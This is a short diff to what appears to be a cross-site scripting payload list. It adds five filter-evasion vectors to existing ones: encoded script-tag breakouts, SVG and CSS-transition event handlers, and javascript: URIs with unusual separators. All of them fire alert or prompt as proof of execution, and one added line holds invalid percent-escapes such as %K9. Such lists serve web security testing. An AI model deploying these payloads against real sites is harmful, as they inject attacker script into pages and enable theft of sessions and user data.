@@ -78,8 +78,8 @@ window[document.body.innerText.charAt(document.body.innerText.indexOf('a'))+'ler
 <noscript><p title="</noscript><img src=x onerror=alert(1)>">
 javascript:"/*'/*`/*--><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
 javascript://comment%0a%0dalert(0);
-
-
-
-
-
+%27<%2FscRipt><scRipt>alert%280%29<%2FscRipt>
+<style>:target {color:red;}</style><xss id=x style="transition:color 1s" onwebkittransitionend=alert(1)>
+<svg><script href=data:,alert(1) />
+Javascript://%E2%80%A9alert(1)
+<Svg%K9OnLoad=%7Krompt%6K1%6K>
